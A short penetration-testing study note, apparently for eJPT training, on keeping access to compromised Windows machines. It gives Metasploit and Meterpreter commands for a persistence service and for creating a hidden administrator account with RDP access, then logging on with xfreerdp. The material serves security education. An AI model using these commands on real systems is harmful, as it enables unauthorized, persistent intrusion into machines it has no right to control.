# 55 Windows Persistence

# Persistence via Services

## Establishing Persistence on Windows

- Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. - MITRE ATT&CK
- Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

### DEMO

```shell
# Get a session, then
msf6: exploit(windows/local/persistence_service)

# Try the persistence
msf: exploit(multi/handler)
# Set the corrent payload! (the previous used)
```


# Persistence via RDP

### DEMO

```shell
# Creating backdoor new user account

# Migrate to process "explorer"
meterpreter: pgrep explorer
meterpreter: migrate <explorer-id>

# Create new user
# Getgui command check RDP, if disabled it will enable it 
# Also hide the user from the Windows login screen
# Add the user to RDP service and Administrator group
meterpreter: run getgui -e -u <user> -p <password> # Creating account 

# Logon via RDP with the new legitimate user
xfreerdp /u:<user> /p:<password> /v:<target-ip>
```


#cybersecurity #eJPT 